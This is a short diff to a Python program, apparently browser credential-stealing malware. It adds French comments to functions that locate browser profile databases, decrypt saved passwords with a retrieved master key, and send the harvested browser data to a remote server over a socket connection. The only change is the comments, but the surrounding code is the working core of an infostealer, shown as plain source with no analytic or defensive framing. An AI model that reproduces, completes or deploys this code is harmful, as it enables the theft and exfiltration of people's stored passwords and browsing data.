@@ -6,6 +6,7 @@ from config import browsers, data_queries
 from encryption_utils import get_master_key, decrypt_password
 
 
+# Fonction pour extraire les données des navigateurs
 def get_data(path: str, profile: str, key, type_of_data):
     db_file = os.path.join(path, f'{profile}{type_of_data["file"]}')
     if not os.path.exists(db_file):
@@ -21,6 +22,7 @@ def get_data(path: str, profile: str, key, type_of_data):
     return format_data(rows, type_of_data, key)
 
 
+# Fonction pour formater les données extraites
 def format_data(rows, type_of_data, key):
     result = ""
     for row in rows:
@@ -31,6 +33,7 @@ def format_data(rows, type_of_data, key):
     return result
 
 
+# Fonction pour envoyer les données des navigateurs au serveur
 def send_browser_data(sio, user_id):
     available_browsers = [browser for browser, path in browsers.items() if os.path.exists(path)]
     for browser in available_browsers:
